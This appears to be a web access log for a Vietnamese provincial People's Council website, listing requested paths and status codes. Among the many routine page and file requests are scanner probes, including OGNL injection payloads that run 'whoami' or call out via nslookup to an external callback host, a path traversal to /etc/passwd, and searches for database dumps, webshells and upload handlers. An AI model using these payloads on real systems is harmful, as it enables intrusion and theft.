/AttachFiles/11.+BC+quyet+toan+ngan+sach+nha+nuoc+tinh+2019031220200844.pdf,200
/audio/27088.mp3,404
/portal/pages/email-contact.aspx,200
/AttachFiles/dai-bieu.aspx,403
/AttachFiles/12.+BC+ket+qua+GSCD+cua+TT+HDND+tinh+ve+cty+TNHH+MTV+KTCTTL+va+cap+bu+thuy+loi+phi100620201037.pdf,206
/api/ping/,404
/audio/27792.mp3,404
/portal/Pages/2023-1-3/Doan-Dai-bieu-Quoc-hoi-tinh-to-chuc-giam-sat-chuye0k4hf8.aspx,200
/updates.php,404
/portal/pages/van-ban/v.aspx,200
/images/icons_title.gif,404
/js/form/TDList.js,200
"/AttachFiles/02.+NQ+chap+thuan+danh+muc+du+an+phai+thu+hoi+dat,+phe+duyet+danh+muc+du+an+chuyen+muc+dich+SDD+duoi+10+ha+dat+trong+lua+sang+muc+dich+khac+nam+2021260420210410.pdf",200
/wp-admin/css/colors/coffee/index.php,404
/+CSCOE+/session_password.html,404
/audio/28012.mp3,404
/webapi/auth,404
/js/form/jquery.idtabs.js,200
/export/backup.sql,404
/hoidongnhandan/1231/29459/39470/Lien-he/nghi-quyet-detail.aspx,404
/hoidongnhandan/1231/29459/39416/Van-phong-HDND-tinh/AttachFiles/tai-lieu-detail.aspx,404
/_layouts/tandan.portal/weather/img/128/04d.png,200
/portal/Pages/2022-6-30/Ban-Kinh-te--Ngan-sach-tham-tra-truoc-ky-hop-thu-boaeofa.aspx,200
/AttachFiles/17-2016-NQ-HDND_201608020415045750120620200831.PDF,200
/portal/Pages/2024-1-12/Hoi-nghi-tong-ket-cong-tac-nam-2023-va-trien-khai-94zzsq.aspx,200
/wp-consar.php,404
/portal/_res/bootstrap/fonts/glyphicons-halflings-regular.woff,200
/portal/Pages/2023-8-25/Nang-cao-chat-luong-giam-sat-cua-Hoi-dong-nhan-danrmjk75.aspx,200
/db.sql,404
/portal/Pages/2022-12-19/3wcv0t.aspx,200
/portal/Pages/default.aspx/fileup.asp,200
/classes/Login.php,404
/hoidongnhandan/1231/29459/39416/Van-phong-HDND-tinh/tai-lieu-detail.aspx,404
/login.action,404
/portal/Photos/2024-03/_w/d4912d5a10db415dPho_png.jpg,200
/portal/VanBan/2023-07/5badbf9b734f758dNghị+quyết+kỳ+họp+thứ+12+HĐND+tỉnh.rar,200
/portal/Photos/2023-10-23/83504848cb58d23dhc+(1).jpg,200
/AttachFiles/13-NQ-HDND_20160802040418308300120620200833.PDF,200
/portal/Pages/2021-10-15/Boi-duong-truc-tuyen-dai-bieu-Hoi-dong-nhan-dan-cavrhflb.aspx,200
/portal/Pages/default.aspx,200
/portal/ImageAds/2db8333db8f3df4dDanhBa.jpg,200
/userfiles/media/DC+NHD.jpg,200
/authenticationendpoint/2egzrxivmnwhsjpqvn4ig3hqijy.jsp,404
/portal/Photos/2023-05/d7aa012939b46d6d5.jpg,200
/portal/admin/modules/quan-tri-lien-ket-anh.aspx,302
/portal/Photos/2022-10/_t/b0dd5c456dcafd0dPXL_20221027_150337433_jpg.jpg,200
/portal/Photos/2023-04/_w/c2c9237ecdeed65dPC1_jpg.jpg,200
/wp-admin/users.php,404
/tin-tuc-thuong-truc-detail.aspx,404
/portal/Photos/2023-07-11/2edd21daf735444d5ff315943b7aeb24b26b.jpg,200
/js/form/form.js,200
/AttachFiles/26+TB+kqua+HN+TTr+HĐND+t8.2016120620200400.doc,200
/anh-detail.aspx,404
"/view-resol-Nghi-quyet-ve-chap-thuan-dieu-chinh-quy-mo,-tong-muc-dau-tu,-thoi-gian-thuc-hien-du-an-Nang-cap-ha-tang-vung-nuoi-trong-thuy-san-xa-Bach-Long,-huyen-Giao-Thuy,-tinh-Nam-Dinh-273.html",400
/portal/Pages/default.aspx/Content/Upload,200
"/AttachFiles/6.+To+trinh+ve+so+luong,+nhan+su+de+bau+Hoi+tham+nhan+dan+cua+Toa+an+nhan+dan+tinh+NK+2021-2026230620210802.pdf",200
/portal/admin,302
/css/layouts/metro.css,200
/portal/Photos/2023-05-12/580a87481075a47d5.jpg,200
/api.php,404
/userfiles/file/TaiLieuTXCT+Ky+hop+6/nghi-quyet-detail.aspx,302
/AttachFiles/quyet+dinh+thÀnh+lẬp+ĐoÀn+giÁm+sÁt+chuyÊn+ĐỀ+030620180628.doc,200
/userfiles/2020/bb.jpg,200
/portal/pages/van-ban/https:/hdnd.namdinh.gov.vn/portal/portal/pages/van-ban/default.aspx,400
/service/extension/backup/mboximport,404
/audio/27928.mp3,404
/database.sql,404
/portal/Pages/default.aspx/up.asp,200
"/portal/VanBan/2021-11/fd94dcbb9cab39bd25.+Q.dinh+che+do+tro+cap+cho+can+bo,+CC,+VC+co+bang+sau+dai+hoc.pdf",200
/AttachFiles/17.+DA+QH+phat+trien+kinh+te+thuy+san011220181013.pdf,200
/audio/28000.mp3,404
/portal/Pages/2021-10-11/Ban-Kinh-te--Ngan-sach-HDND-tinh-Nam-Dinh--Khoa-XImk5hlt.aspx,200
"/portal/VanBan/2024-03/a17e5047a220e3cdKH+Tổ+chức+kỳ+họp+thứ+17+(để+giải+quyết+công+việc+phát+sinh+đột+xuất)+HĐND+tỉnh+khóa+XIX,+NK+2021-2026.pdf",206
/portal/Pages/default.aspx/fileupload.asp,200
/admin/mysql.sql,404
/login,404
/AttachFiles/26.+Phí+thư+viện040620180843.pdf,200
/wp-content/uploads/style.php,404
/AttachFiles/70_KH_20210629093550131130290620210944.pdf,200
/portal/_layouts/Authenticate.aspx,302
/login.htm,404
/wp-content/plugins/woc-order-alert/assets/admin/js/scripts.js,404
"/hoidongnhandan/1231/29459/39415/Ban-Phap-che-HDND-tinh/AttachFiles/AttachFiles/NQ+76+chap+thuan+dieu+chinh+du+an+cai+tao,+nang+cap+duong+Khang+Thuan,+H+Truc+Ninh151220200306.pdf",404
/portal/_res/bootstrap/css/bootstrap.min.css,200
/AttachFiles/9.+BC+giai+quyet+ket+qua+khieu+nai+ky+5280620180856.pdf,200
/home.html,404
/portal/Pages/2024-2-2/Dong-chi-Pho-Chu-tich-HDND-tinh-Mai-Thanh-Long-thahfdqzj.aspx,200
/_layouts/images/fgimg.png,200
/portal/_res/css/component.css,200
/portal/_res/img/ic-widget.png,200
/userfiles/media/TD+DBQH1.jpg,200
/wp-content/plugins/quiz-master-next/tests/_support/AcceptanceTester.php,404
/vcac/,404
/backupsettings.dat,404
/portal/pages/photos/w.aspx,200
/portal/Pages/2023-1-12/Tham-tang-qua-cho-gia-dinh-cac-em-nho-co-hoan-canh7p1aq9.aspx,200
/cgi-bin/system_mgr.cgi,404
/simple.php,404
/portal/pages/video/default.aspx,200
/wp-content/plugins/canto/includes/lib/detail.php,404
/portal/_res/fonts/RobotoCondensed-Bold.ttf,200
/portal/Photos/2023-04/_t/844051d177145f0d3_jpg.jpg,200
/userfiles/file/2019/GSYT_2.jpg,404
/portal/Pages/default.aspx/api/fileup,200
/conf_mail.php,404
/components/com_moofaq/includes/file_includer.php,404
/.well-known/traffic-advice,500
/img/loading-white.gif,200
/wp-content/plugins/arprice-responsive-pricing-table/js/arprice.js,404
/portal/Photos/2023-08/9b68506b4db2485d4.jpg,200
/userfiles/file/TaiLieuTXCT+Ky+hop+6/AttachFiles/tai-lieu-detail.aspx,302
/api/config,404
/portal/Pages/2022-5-27/Chi-doan-Van-phong-Doan-DBQH-va-HDND-tinh-Nam-Dinhvfyop5.aspx,200
/hoidongnhandan/1231/29459/40968/Thuong-truc-HDND-tinh/AttachFiles/nghi-quyet-detail.aspx,404
/cgi-bin-hax/ExportSettings.sh,404
/portal/Photos/2024-03/_w/6e87739028bc2b5da5_20240313090337_jpg.jpg,200
/lab.html,404
/portal/Pages/2023-11-3/Cong-tac-hoan-thien-du-thao-Luat-Dat-dai-sua-doi-dywoz1j.aspx,200
/hoidongnhandan/1231/29459/42083/Hoi-dong-nhan-dan-huyen-Hai-Hau/AttachFiles/01.+NQ+mien+nhiem+PCT+UBND+tinh220320211002.pdf,404
/portal/Photos/2022-06/_t/a7ce4d01f10fd81d4_jpg.jpg,200
/css/layouts/font-awesome.min.css,200
/jira/secure/QueryComponentRendererValue!Default.jspa,404
/data/data.sql,404
/portal/_res/fonts/Roboto/roboto-v18-latin_vietnamese_latin-ext-500.woff2,200
/scgi-bin/platform.cgi,404
/_layouts/tandan.portal/jslibs/jquery-ui/jquery-ui-tabs-rotate.js,200
/nghi-quyet-view.aspx,404
/admin/index.php,404
/portal/VanBan/2021-12/b1cdd0e8ec21b44d46.+98.+NQ+ban+hanh+Quy+che+bi+mat+nha+nuoc+cua+HDND+tinh.pdf,200
/EemAdminService/EemAdmin,404
/dataservice/etc/passwd,404
/portal/Photos/2021-10-17/cf07fcea8331b37dmtl.jpg,200
/Default.aspx,404
/css/form/layouts.custom.css,200
/Pages/layouts.min.js,404
"/hoidongnhandan/1231/29459/40926/Chuc-nang-nhiem-vu/AttachFiles/5.NQ+bai+bo+1+phan+NQ+53+2017+quy+dinh+muc+thu,+che+do+thu,+nop+va+quan+ly+le+phi+ho+tich210720210940.pdf",404
/_next/server/pages-manifest.json,302
"/portal/VanBan/2021-11/d793524cb0d364d20.+Danh+muc+d.an,+c.trinh+chuyen+muc+dich+SDD+duoi+10+ha+dat+trong+lua,+duoi+20ha+dat+rung+phong+ho.pdf",200
"/AttachFiles/8.+NQ+ve+c.thuan+d.chinh+thoi+gian+xay+dung+khu+do+thi+thuong+mai+Con+-+Văn+ly,+huyen+Hai+Hau030920200839.pdf",200
/wp-security.php,404
/_layouts/tandan.portal/images/tinnhiemcong.png,200
/portal/Pages/2023-4-21/Ban-Kinh-te--Ngan-sach-HDND-tinh-tham-tra-truoc-kyp9d7is.aspx,200
/portal/Photos/2024-02/_t/d0771fd71e862a9danh2_20240131114528_jpg.jpg,200
/portal/Pages/2023-3-31/Lay-y-kien-dong-gop-vao-du-an-Luat-Phong-thu-dan-s5ifkdl.aspx,200
/https:/namdinh.gov.vn/portal/pages/van-ban/default.aspx,400
/portal/LinkImage/dff8a0aaf18e9ddCSDL-2.jpg,200
/AttachFiles/NQ41120620200929.doc,200
/_layouts/sp.ribbon.js,200
/portal/Pages/default.aspx/api/file.ashx,200
/hoidongnhandan/1231/29461/39541/81626/Nghien-cuu---Trao-doi/Kien-toan-to-chuc-va-nang-cao-nang-luc-tham-muu-giup-viec-cua-co-quan-van-phong-HDND-tinh--Thuong-truc-HDND-tinh-Quang-Ninh-.aspx,403
/audio/28072.mp3,404
/hoidongnhandan/1231/29461/40929/80165/Ky-hop-thu-hai/Nghi-quyet-so-14-NQ-HDND-ngay-21-7-2016-Ve-viec-phe-chuan-tong-quyet-toan-ngan-sach-nha-nuoc-tinh-Nam-Dinh-nam-2015.aspx,404
/_layouts/tandan.portal/weather/img/128/01n.png,200
/axis2/axis2-admin/login,404
/portal/_res/img/bg-body.png,200
/portal/Pages/2019/Giam-sat-cong-tac-dau-tu-quan-ly-va-su-dung-trang--932940.aspx,200
/portal/pages/Lich-lam-viec-tuan.aspx,200
/AttachFiles/14-NQ-HDND_20160802040653733730120620200833.PDF,200
/portal/Pages/default.aspx/fileupload.ashx,200
/portal/_res/img/bg-footer-min.png,200
/portal/_res/bootstrap/fonts/glyphicons-halflings-regular.ttf,200
/portal/_res/img/new.gif,200
/sitecore/shell/ClientBin/Reporting/Report.ashx,302
/js/form/danh-muc.js,200
/_layouts/tandan/img/remove-icon-small.png,200
/audio/27684.mp3,404
"/AttachFiles/24.+QĐ+phân+cấp+quản+lý,+SD,+sử+lý+TS+công100620201138.pdf",304
/images/news/090520190835GSYT.1.jpg,404
/portal/Photos/2022-08-16/c5b0fd64ad64186dimages1343454_Untitled_1.jpg,200
/cgi-bin/admin.cgi,404
/css/form/chosen.css,200
/hoidongnhandan/1231/29459/39416/Van-phong-HDND-tinh/AttachFiles/AttachFiles/tai-lieu-detail.aspx,404
/app/options.py,404
/portal/Pages/2022-8-16/Nang-cao-chat-luong-dai-bieu-Hoi-dong-nhan-dan-cacevuibi.aspx,200
/portal/Photos/ef8c9b3f80e91dfdNamDinh.jpg,200
/portal/Photos/2022-09-29/9134cdfa3a8349ddimages1344613_Untitled_1.jpg,200
/portal/Pages/2021-12-1/Khai-mac-trong-the-Ky-hop-thu-tu-HDND-tinh-khoa-XIu4fymh.aspx,200
/portal/_themes/Portal_red/img/up.png,200
/audio/27115.mp3,404
/userportal/Controller,404
/uploads/database.sql,404
/hoidongnhandan/1231/29461/42095/89520/Trong-tinh/Tap-huan-Luat-Ngan-sach-Nha-nuoc-nam-2015.aspx,404
/cgi-bin/execute_cmd.cgi,404
/dfsms/,404
/audio/27804.mp3,404
/portal/Pages/default.aspx/api/upload.ashx,200
/portal/Pages/default.aspx/api/Uploadify,200
/_layouts/tandan.portal/jslibs/back-to-top.js,200
/portal/Pages/2021/Ban-Van-hoa-Xa-hoi-HDND-tinh-tham-tra-truoc-ky-hop-644262.aspx,200
/portal/Photos/2023-01-19/736d821a8ed379dIMG_2385.jpg,200
/webGui/images/green-on.png/,404
/hoidongnhandan/1231/29461/42095/87261/Trong-tinh/Hoi-nghi-lan-thu-11-Ban-Chap-hanh-Dang-bo-tinh-khoa-XIX.aspx,404
/admin/,404
/fileupload/toolsAny,404
/audio/28099.mp3,404
/actions/authenticate.php,404
/uploads/assets/backend/elfinder/elfinder-cke.html,404
/audio/27909.mp3,404
/portal/Pages/2021-10-13/Ban-Van-hoa--Xa-hoi-HDND-tinh-Nam-Dinh--Khoa-XIX-Nbwj71y.aspx,200
/portal/_res/bootstrap/js/bootstrap.min.js,200
/AttachFiles/09-NQ-HĐND100620201149.pdf,200
"/hoidongnhandan/1231/29459/42085/Hoi-dong-nhan-dan-huyen-Giao-Thuy/AttachFiles/3-+NQ+71+ve+du+toan+thu+chi+NS,+phuong+an+phan+bo+va+ke+hoach+dau+tu+cong+nam+2018120620200952.doc",404
/portal/Pages/2021/Dong-chi-Le-Quoc-Chinh-Pho-Bi-thu-Thuong-truc-Tinh-307014.aspx,200
/portal/Pages/2023-5-26/Giam-sat-chuyen-de-cua-Ban-Kinh-te--Ngan-sach-ve-Huj8ell.aspx,200
/AttachFiles/25.+BC+ket+qua+nhiem+vụ+QPQS+dia+phuong+2019100620201112.pdf,304
/portal/_themes/Portal_red/img/arrow-next-icon.png,200
/audio/27882.mp3,404
/AttachFiles/kh_gs+ban+vhxh030620180627.doc,200
/portal/Photos/2023-12/3f8bdd5f13dd5d4dbia10.jpg,200
/portal/Photos/2023-06/fceb6981cc0835bda1_20230628124037.jpg,200
/dashboard/,404
/portal/Pages/2024-3-19/Uy-ban-Thuong-vu-Quoc-hoi-chat-van-cac-van-de-thuoseeqg1.aspx,200
/css/layouts/bootstrap-responsive.min.css,200
/names.nsf/People,404
/hoidongnhandan/1231/29461/42095/87150/Trong-tinh/Uy-ban-nhan-dan-tinh-Nam-Dinh-trien-khai-nhiem-vu-phat-trien-kinh-te---xa-hoi-quy-II.aspx,404
/AttachFiles/nghiquyet_13_nq_tthdnd120620200750.pdf,200
/img/syncfusion-icons-white.png,200
/portal/Photos/2023-01/91423b4815414d6d20230113_144826_HDR_2.jpg,200
/photo/combine.php,404
/api/agent/tabs/agentData,404
/portal/Photos/2022-10-28/6bb4c78efdf6473dPXL_20221027_150337433.jpg,200
/q,404
/wp-json/am-member/license,404
/portal/Photos/2023-09/e32bfc1206e3158ddbqh.jpg,200
/webshell4/login.php,404
/portal/Photos/2021-10-17/9122007a090929ddndc.jpg,200
/jeecg-boot/jmreport/qurestSql,404
/uploads/elfinder/elfinder-cke.html,404
/login/index.php,404
/wp-admin/style.php,404
/AttachFiles/20a.+Quy+hoạch+vùng+H.Hải+Hậu+-+Sơ+đồ040620180828.pdf,206
/RestAPI/LogonCustomization,404
/s/2eCvhbIx1V3VaRtuULy0jshMUfU/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml,404
/hoidongnhandan/1231/29459/39511/lich-cong-tac/nghi-quyet-detail.aspx,404
/portal/Photos/2024-01/3b9df05d10ddd80dcover.jpg,200
/uploads/assets/backend/elfinder/elfinder.html,404
/AttachFiles/qĐ+24+thành+lập+văn+phònghĐnd+tỉnh030620180623.doc,200
/https:/hdnd.namdinh.gov.vn/_forms/td-login.aspx,400
/portal/Pages/2023-5-20/Dien-van-cua-dong-chi-Pham-Gia-Tuc-Uy-vien-BCH-Truvs5wgw.aspx,200
/AttachFiles/NghiQuyetKyHop11110620201203.zip,200
/portal/Photos/2021-10-20/16244f682459ed2dTBN1.jpg,200
/_api/web/currentuser,404
/hoidongnhandan/1231/29461/40927/79214/Co-cau-to-chuc/Ban-Phap-che-HDND-tinh-Nam-Dinh---Khoa-XVIII--nhiem-ky-2016---2021.aspx,404
/hoidongnhandan/1231/29459/39471/so-do-site/van-ban-kinh-te.aspx,404
/portal/Photos/2024-03/_t/d4912d5a10db415dPho_png.jpg,200
/portal/Photos/2023-04-24/d0f6edfd6dd400cda1.jpg,200
/hoidongnhandan/1231/29461/39412/99571/Tin-tuc---Hoat-dong/Uy-ban-nhan-dan-tinh-phat-dong-phong-trao-thi-dua-nam-2018.aspx,404
/js/form/TDCommon.js,200
/_layouts/sp.core.js,200
/AttachFiles/6.+BC+tham+tra+Ban+P+C100620201100.pdf,304
/portal/Pages/2023-5-20/Chu-tich-nuoc-Vo-Van-Thuong-ve-tham-va-lam-viec-ta5i2e4s.aspx,200
/portal/Photos/2024-01/_w/fe15bc366eb2e43d12345_jpg.jpg,200
/page,404
/ccms/dashboard.php,404
/_layouts/tandan.portal/jslibs/jquery-ui/jquery-ui-1.9.0.custom.min.js,200
/export/database.sql,404
/exchweb/bin/redir.asp,404
/index.php/user/,404
/style.php,404
/portal/ImageAds/cf2393ac6dd6ef2dGopYVB.jpg,200
/portal/Photos/2021-10-17/2dd45cd26d72f63dPolish_20201209_074609685.jpg,200
/portal/Pages/2022-8-19/Hoi-dong-nhan-dan-thanh-pho-Nam-Dinh-tap-trung-donbb3uit.aspx,200
/pfblockerng/www/index.php,404
/portal/Photos/2022-10-28/41cc1765d7d19a7dPXL_20221027_150952279.jpg,200
/js/layouts/jquery.cookie.js,200
/data/backups.sql,404
/_layouts/tandan.portal/weather/locations.js,200
/autodiscover/autodiscover.json,302
/audio/27836.mp3,404
/services/pluginscript/..,400
/AttachFiles/18.+DA+quy+dinh+muc+thu+hoc+phi011220181014.pdf,200
"/view-resol-Nghi-quyet-so-29-NQ-HDND,-ngay-08-12-2018-Thong-qua-quy-hoach-chung-do-thi-moi-thuoc-dia-phan-4-xa:-Yen-Bang,-Yen-Quang,-Yen-Hong,-Yen-Tien-huyen-Y-Yen-den-nam-2035-111.html",400
/portal/Photos/2022-09-15/d8c0a85efc8c9cadimages1344273_Untitled_1.jpg,200
/2eGZrlZ2iG5CbfJDmbmbgwLRTqf,404
/js/form/datetimepicker.min.js,200
/portal/Photos/2024-01/a12ee0ce325f43ad123.jpg,200
/modules/appagebuilder/apajax.php,404
/portal/_themes/Portal_red/img/art-tools.png,200
/portal/_res/bootstrap/fonts/glyphicons-halflings-regular.woff2,200
/AttachFiles/14.+BC+ket+qua+GS+thuc+hien+NQ+cua+HDND+tinh100620201110.pdf,200
"/AttachFiles/17.+Quy+dinh+phan+cap+tham+quyen+quyet+dinh+mua+sam+tai+san,+hang+hoa,+dich+vu+cua+cac+co+quan,+to+chuc+thuoc+dia+phuong+quan+ly031220200847.pdf",304
/auth/newpassword,404
"/hoidongnhandan/1231/29459/42096/Trong-nuoc/AttachFiles/AttachFiles/30.+NQ+sua+doi,+bo+sung+NQ+27+HDND131220180424.pdf",404
/css/layouts/style_default.css,200
/apisix/batch-requests,404
"/AttachFiles/10.+NQ+q.dinh+c.truong+dau+tu+xay+du+an+xay+dung+khu+dan+cu+tap+trung+xa+Dong+Son,+huyen+Nam+Truc220320211008.pdf",200
/goforms/menu,404
/portal/Photos/2022-07-18/c76c90d6c504cacdanh+bai+1+nd.jpg,200
/apple-touch-icon-precomposed.png,404
/cgi-bin/mesh.cgi,404
"/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(""whoami"").getInputStream(),""utf-8"")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(""X-Cmd-Response"",#a))}/",500
"/userfiles/file/TaiLieuTXCT+Ky+hop+6/AttachFiles/AttachFiles/NQ+65+q.dinh+c.truong+d.tu+d.ab+kien+co+hoa+kenh+Hai+Ninh,+Hai+Ninh+21,+Hai+Ninh+23,+kenh+CC5+thi+tran+Co+le,+huyen+Truc+Ninh151220200259.pdf",404
/assets/php/upload.php,404
/+CSCOT+/oem-customization,404
/css/form/jquery.ui.plupload.css,200
/hoidongnhandan/1231/29459/39471/so-do-site/van-ban-van-phong.aspx,404
/_layouts/tandan.portal/weather/img/48/04d.png,200
/portal/Pages/default.aspx/Manage/Uploadify,200
/portal/_res/img/bg-title.png,200
/wp-admin/,404
/audio/28093.mp3,404
/portal/Photos/2021-10-17/f4093aecd43d22ednph.jpg,200
/portal/_themes/Portal_red/theme.css,200
/portal/admin/notifi.js,200
/_layouts/tandan.portal/weather/img/128/10d.png,200
/incom/modules/uploader/showcase/script.php,404
/login.php,404
/hoidongnhandan/1231/29459/40928/Thu-vien-anh/AttachFiles/AttachFiles/4.+NQ+ve+c.thuan+c.truong+d.an+d.tu+Benh+vien+da+khoa+tinh+(Benh+vien+da+khoa+quy+mo+700+giuong+tinh+ND+cu)030920200836.pdf,404
/audio/27479.mp3,404
/audio/27962.mp3,404
/portal/Pages/2021-10-11/Thuong-truc-HDND-tinh-Nam-Dinh--Khoa-XVIII-nhiem-kl6f3p2.aspx,200
/css/form/jquery.fancybox.css,200
/classes/Master.php,404
/ddns_check.ccp,404
/portal/admin/tai-nguyen/thu-vien-anh.aspx,200
/a/b/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,400
/portal/Photos/2024-03/_t/6e87739028bc2b5da5_20240313090337_jpg.jpg,200
/upload/userfiles/image/2eCvhOrYhjsSIjCx6gdCXZrfhve.png,404
/portal/Photos/2023-12-25/c940eee6414324d44.jpg,200
/hoidongnhandan/1231/29459/39471/so-do-site/van-ban.aspx,404
/portal/Pages/2024-1-22/Hoi-nghi-gap-mat-can-bo-huu-tri-co-quan-Van-phong-9sfopd.aspx,200
/hoidongnhandan/1231/29459/39407/Gioi-thieu/AttachFiles/NQ+44+dieu+chinh+chu+truong+d.tu+DA+x.dung+duong+Luu+Huu+Phuoc+keo+dai+&+khu+TDC+Lien+Ha+1110620201200.pdf,400
/hoidongnhandan/1231/29461/39413/87353/Ban-Kinh-te---Ngan-sach-HDND-tinh/Quyet-dinh-so-09-QD-KTNS--ngay-14-4-2017-cua-Ban-Kinh-te---Ngan-sach-ve-viec-thanh-lap-Doan-giam-sat-chuyen-de-.aspx,404
"/AttachFiles/10.+Q.dinh+ch.truong+dau+tu,+ch.truong+dieu+chinh+d.an+dau+tu+cong140720210811.pdf",200
/portal/pages/van-ban/default.aspx,200
/hoidongnhandan/1231/29459/39511/lich-cong-tac/ban-van-hoa.aspx,404
/_layouts/ScriptResx.ashx,200
/wp-content/plugins/infographic-and-list-builder-ilist/assets/js/ilist_custom_admin.js,404
/AttachFiles/NQ8120620200804.pdf,200
/alfanew.php,404
/portal/LinkImage/61ec8cf84cdf88fdQLVBDH1.jpg,200
/portal/Photos/2021-10-17/9de5537d8d82552d20210412_084110.jpg,200
/portal/Photos/9c045505cb7dd5edkhoaha.txt,200
/portal/Pages/default.aspx/tools/Uploadify/Uploadhandler.ashx,200
/admin/user.php,404
/portal/Pages/2023-9-26/So-ket-giua-nhiem-ky-thuc-hien-Nghi-quyet-Dai-hoi-iyvjts.aspx,200
/portal/Photos/2023-05/9a01470d15c35d5ddai_dien_20230522101035.jpg,200
/uploads/mysql.sql,404
/_layouts/tandan.portal/weather/img/48/04n.png,200
/AttachFiles/tai-lieu-detail.aspx,403
/zabbix/index_sso.php,404
/portal/Pages/default.aspx/tools/Upload.ashx,200
/AttachFiles/44.+BC+c.tac+6+thang+dau+năm+2019+Bo+chi+huy+BDBP+tinh100620201050.pdf,304
/vendor/qcubed/qcubed/assets/php/profile.php,404
/goform/setSysAdm,404
/auth/requestreset,404
/audio/28063.mp3,404
/portal/Pages/2024-3-27/,302
"/${@java.lang.Runtime@getRuntime().exec(""nslookup+co1uo51lnrhh1f0jg5m0w8r8qxahdr39n.oast.live"")}/",500
/robots.txt,404
/portal/_res/fonts/Roboto/roboto-v18-latin_vietnamese_latin-ext-500italic.woff2,200
/AttachFiles/AttachFiles/href='/tai-lieu-detail.aspx,302
/2eGZrfGIBAQUTh9B7mqQXbwkLIN.txt,302
/js/form/TDWebservice.js,200
/dfsms/index.php,404
/user,404
/hoidongnhandan/1231/29459/39470/Lien-he/AttachFiles/tai-lieu-detail.aspx,404
/portal/LinkImage/580d5be9b7118d4dQuocHoi-2.jpg,200
/css/layouts/popup-style-responsive.css,200
/portal/Photos/2024-01/e46c3d0094bfd45d1.jpg,200
/AttachFiles/18tb-Đc+chung+-+ctichj+hĐnd030620180642.pdf,200
/wp-json/wp/v2/lesson/1,404
/RestAPI/ImportTechnicians,404
/portal/pages/default.aspx,200
/AttachFiles/34_NQ_HĐND120620200858.docx,200
/portal/Pages/2023-12-10/5v4j48.aspx,200
/portal/Pages/2023-5-26/UBND-tinh-danh-gia-ket-qua-phat-trien-kinh-te--xa-bosifw.aspx,200
"/hoidongnhandan/1231/29459/40926/Chuc-nang-nhiem-vu/AttachFiles/NQ+39+xay+dung+cang+ca+Quan+Vinh,+h.+Nghia+Hung+(g.d+1)100620201159.pdf",404
/portal/Pages/2023-6-15/Dong-chi-Pho-Chu-tich-Thuong-truc-HDND-tinh-chuc-m46xrwh.aspx,200
/portal/Photos/2021-10-17/d7dd2019690dba2dtmd.jpg,200
/portal/Pages/2024-3-8/Hoi-nghi-truc-tuyen-toan-quoc-lan-thu-hai-trien-khp7ix33.aspx,200
/portal/Photos/2024-02/d0771fd71e862a9danh2_20240131114528.jpg,200
/_layouts/tandan.portal/jslibs/fancybox/jquery.fancybox.pack.js,200
/AttachFiles/31.+Cac+BC+cua+Ban+VHXH060620180942.pdf,200
/portal/Photos/2024-03-25/d3e7c7989d9ab35d2.jpg,200
/addons/,404
/portal/Photos/2023-12/f704d6d75b2eb65dTxct+QH.jpg,200
/data/backup.sql,404
/portal/_res/css/img/loader.gif,200
/infusions/downloads/downloads.php,404
/hoidongnhandan/1231/29459/39541/Nghien-cuu---Trao-doi/nghi-quyet-detail.aspx,404
/portal/Photos/2022-09/e92403c6ead0116dimages1344611_Untitled_1.jpg,200
/AttachFiles/06-NQ-HĐND110720180815.pdf,304
/task/loginValidation.php,404
/SAAS/t/_/,404
/img/black-bg.png,200
/admin/login.php,404
/wp-content/plugins/vr-calendar-sync/assets/js/public.js,404
/elfinder/php/connector.minimal.php,404
/portal/Pages/default.aspx/Admin/Upfile,200
"/portal/VanBan/2023-06/b6741f21a4dca26dQuyết+định+triệu+tập+kỳ+họp+thường+lệ+giữa+năm+2023+của+HĐND+tỉnh+khóa+XIX,+NK+2021-2026.pdf",200
/cgi-bin/downloadFlile.cgi,404
/SDK/webLanguage,302
/auth/check,404
/_layouts/tandan.portal/weather/img/48/03d.png,200
"/AttachFiles/23.+NQ+dieu+chinh+d.an+x.dung+TL+485B,+doan+tu+de+huu+song+Dao+den+QL+21B200720210201.pdf",200
/aspera/faspex/package_relay/relay_package,404
/portal/Photos/2021-10-18/3cacddbc7dbed63dmtl1.jpg,200
/hoidongnhandan/1231/29461/40968/84874/Thuong-truc-HDND-tinh/Bao-cao-so-28-BC-HDND-ngay-08-12-2016-Cong-tac-cua-Thuong-truc-Hoi-dong-nhan-dan-tinh-tu-ky-hop-thu-nhat-den-ky-hop-thu-ba-HDND-tinh-khoa-XVIII.aspx,403
/audio/28101.mp3,404
/adm/file.cgi,404
/portal/Photos/2021-11/_t/ddbbd6c79cd6c2ddz2914861754151_dc061625185e4d3e25a877abca4e95d5_jpg.jpg,200
/portal/Photos/2023-10-23/cb8893cb99e86dddhc+(2).jpg,200
/cgi-bin/touchlist_sync.cgi,404
/hms/doctor/,404
/audio/27377.mp3,404
/AttachFiles/3.+BC+ket+qua+GSCD+cua+TT+HDND+tinh051220180759.pdf,200
/portal/Pages/default.aspx/tools/Uploadify.ashx,200
/portal/pages/https-hdnd-namdinh-gov-vn-portal-pages-van-ban-v-.aspx,200
/dump.sql,404
"/portal/VanBan/2021-11/e59ffdf1dc4d324d14.+BC+phan+bo+du+toan+thu,+chi+ngan+sach+NN+nam+2022.pdf",304
/setup.cgi,404
/js/form/TDForm.js,200
/hoidongnhandan/1231/29459/39471/so-do-site/anh.aspx,404
/wp-content/plugins/stopbadbots/assets/js/stopbadbots.js,404
"/portal/VanBan/2021-10/37dede79d609adNQ+44+phan+cap+tham+quyen+de+an+cho+thue+quyen+khai+thac,+xl+t.san+ket+cau+h.tang+thuy+loi.pdf",200
/_layouts/tandan.portal/weather/img/48/01n.png,200
/wp-content/themes/twentyseventeen/page/index.php,404
/portal/Photos/2024-01/_t/a12ee0ce325f43ad123_jpg.jpg,200
/_layouts/tandan.portal/weather/img/48/10n.png,200
"/hoidongnhandan/1231/29459/40926/Chuc-nang-nhiem-vu/AttachFiles/26.+NQ+c.thuan+d.chinh+d.an+di+dan+khan+cap+vung+sat+lo+bao+song+Ninh+Co,+H+Truc+Ninh200720210203.pdf",404
/js/layouts/breakpoints.js,200
/elfinder/elfinder-cke.html,404
/dologin.action,404
/portal/Pages/2023-10-20/Thong-bao-ket-luan-cua-Ban-Thuong-vu-Tinh-uy-ve-Phj46eoh.aspx,200
/portal/Pages/default.aspx/api/fileupload,200
